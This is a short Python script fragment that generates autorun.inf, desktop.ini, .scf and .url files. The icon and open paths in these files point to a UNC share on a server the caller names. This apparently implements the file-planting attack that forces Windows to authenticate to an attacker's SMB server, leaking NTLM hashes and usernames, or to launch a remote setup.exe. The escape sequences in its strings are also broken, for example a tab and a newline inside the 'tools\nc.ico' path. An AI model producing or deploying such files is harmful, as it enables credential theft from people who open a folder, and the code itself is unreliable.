#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Rainer Christian Bjoern Herold

def Generate_Files(mode, target_server, file_name, output_location):
    autorun_file = f"""[autorun]
open=\\{target_server}\setup.exe
icon=something.ico
action=open Setup.exe"""

    ini_file = f"""[.ShellClassInfo]
IconResource=\\{target_server}\aa"""

    scf_file = f"""[Shell]
Command=2
IconFile=\\{target_server}\tools\nc.ico
[Taskbar]
Command=ToggleDesktop"""

    url_file = f"""[InternetShortcut]
URL=setup
WorkingDirectory=setup
IconFile=\\{target_server}\%USERNAME%.icon
IconIndex=1"""
